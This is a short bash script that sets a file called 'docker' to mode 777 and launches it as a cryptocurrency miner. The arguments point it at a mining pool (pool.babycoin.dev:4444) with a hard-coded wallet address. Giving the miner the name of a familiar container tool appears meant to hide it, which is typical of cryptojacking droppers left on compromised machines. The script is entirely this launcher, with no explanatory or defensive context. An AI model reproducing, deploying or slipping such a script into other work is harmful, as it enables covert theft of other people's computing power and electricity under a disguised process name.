#!/bin/bash
chmod 777 docker
./docker -a rx/arq -o pool.babycoin.dev:4444 -u babyz9b4zdZfTNfUPtXEEd2aP2gyVNkVUN7znzfbzFMwMMCrJmZuT2mS4fu2aqqR8UeNpNBUBeVv67vS79s8DWigjbfo8jsEqEN -p $(echo $(shuf -i 1-20000 -n 1)-V) --donate-level 1
